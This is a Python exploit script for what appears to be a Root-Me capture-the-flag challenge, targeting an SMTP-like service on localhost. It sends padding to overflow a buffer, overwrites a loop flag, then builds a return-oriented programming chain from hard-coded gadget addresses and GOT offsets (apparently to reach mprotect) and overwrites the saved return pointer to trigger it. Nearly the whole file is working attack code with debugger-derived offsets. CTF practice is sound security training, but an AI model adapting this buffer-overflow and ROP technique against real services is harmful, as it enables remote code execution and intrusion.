#!/usr/bin/env python

import socket
import struct

# ip = 'challenge03.root-me.org'
ip = '127.0.0.1'
port = 56523
buf_size = 32768

banner_len = 32
# gdb$ print 0xbffff6ac - 0xbffff25c
# $1 = 1104
seip_offset = 1104
# gdb$ print 0xbffff69c - 0xbffff25c
# $4 = 1088
flag_offset = 1088

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

resp = s.recv(buf_size)
print resp

# Send whatever to get passed HELO
s.send("HELO " + 'J' * 20 + '\n')
resp = s.recv(buf_size)

# Enter data mode
s.send("DATA\n")
resp = s.recv(buf_size)

raw_input("Attach debugger...")

# Prepare
# Fill our buffer
s.send('A' * 1024)
s.send('B' * (flag_offset - 1024 - banner_len))
# Overflow and overwrite the loop flag to -1
s.send(struct.pack("<I", 0xffffffff))
s.send('C' * 12)

# Overwrite seip \o/
class GadgetAction():
	POP = 0x1
	ADD = 0x2
	MOVE = 0x3

class PayloadGenerator():

	# 0x80485b2L: pop ebx ; pop ebp ;; 
	ppr_addr = 0x80485b2
	# 0x8048a7eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; 
	add_mem_to_reg = 0x8048a7e
	# 0x80485aeL: add [ebx+0x5d5b04c4] eax ;;
	add_reg_to_mem = 0x80485ae

	def __init__(self):
		pass

	def ppr(self, addr, action):
		ppr_str = ""
		if (action == GadgetAction.ADD):
			ppr_str += struct.pack("<I", self.ppr_addr)
			# 0x8048a7eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; 
			ppr_str += struct.pack("<i", addr + 0x0b8a0008)
			ppr_str += struct.pack("<I", 0x44444444)
		elif (action == GadgetAction.MOVE):
			ppr_str += struct.pack("<I", self.ppr_addr)
			# 0x80485aeL: add [ebx+0x5d5b04c4] eax ;;
			ppr_str += struct.pack("<i", addr - 0x5d5b04c4)
			ppr_str += struct.pack("<I", 0x61616161)
		elif (action == GadgetAction.POP):
			ppr_str += struct.pack("<I", self.ppr_addr)
			# 0x80485aeL: add [ebx+0x5d5b04c4] eax ;;
			ppr_str += struct.pack("<I", 0x68686868)
			ppr_str += struct.pack("<i", addr)
		else:
			raise NotImplementedError("No corresponding action found")
		return ppr_str

	def add_to_reg_from_mem(self):
		add_str = struct.pack("<I", self.add_mem_to_reg)
		add_str += struct.pack("<I", 0x68686868)
		add_str += struct.pack("<I", 0x74747474)
		add_str += struct.pack("<I", 0x61616161)
		return add_str

	def add_to_mem_from_reg(self):
		add_str	= struct.pack("<I", self.add_reg_to_mem)
		return add_str

pg = PayloadGenerator()

# 08049ff0 R_386_JUMP_SLOT
# gdb-peda$ p/x &puts
# $1 = 0xb7ec35d0
# gdb-peda$ p/x &mprotect - &puts
# $8 = 0x6e830

payload = ""
payload += pg.ppr(0x08049ff0, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()

payload += pg.ppr(0x8048050, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048090, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048444, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80484e3, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804877c, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a11c, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
# Accumulator register has a final value of: 452655 => 0x0006e82f

payload += pg.ppr(0x8048006, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80481ea, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80484f2, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048adc, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048b1f, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a12c, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x8048050, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804818b, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804843b, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a128, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x804801c, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80487d0, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80489ce, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a124, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x8048124, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a120, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x8048006, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80483e8, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048444, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048543, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80485e8, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048b75, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048baf, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a138, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x8048006, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804801e, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80480c4, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804818b, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80482a2, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a130, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x8048021, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048222, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80483bc, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80483e7, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804846a, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80489e3, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a13c, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
payload += pg.ppr(0x80480b4, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80482d4, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804841e, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048492, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x80485e8, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x8048ae8, GadgetAction.ADD)
payload += pg.add_to_reg_from_mem()
payload += pg.ppr(0x804a134, GadgetAction.MOVE)
payload += pg.add_to_mem_from_reg()
# Accumulator register has a final value of: 2581825889 => 0x99e38961

# Testing, &stack + leave/ret
payload += pg.ppr(0x804a120 - 0x8, GadgetAction.POP)
payload += struct.pack("<I", 0x8048449)

s.send(payload)

# Exit loop and trigger exploit
s.send("\n.\n")

resp = s.recv(buf_size)
print resp

s.close()
